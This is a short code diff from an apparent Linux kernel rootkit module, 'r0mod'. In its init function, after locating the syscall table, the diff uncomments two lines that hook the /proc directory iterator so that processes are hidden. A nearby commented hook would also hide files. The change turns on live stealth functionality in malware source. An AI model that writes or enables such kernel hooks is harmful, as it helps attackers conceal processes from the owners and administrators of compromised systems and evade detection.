@@ -327,8 +327,8 @@ static int __init r0mod_init(void)
     DEBUG("Search Found: sct @ %lx\n", (unsigned long)sct);
 
     /* Hook /proc for hiding processes */
-    //proc_iterate = get_vfs_iterate("/proc");
-    //hijack_start(proc_iterate, &n_proc_iterate);
+    proc_iterate = get_vfs_iterate("/proc");
+    hijack_start(proc_iterate, &n_proc_iterate);
 
     /* Hook / for hiding files and directories */
     //root_iterate = get_vfs_iterate("/");
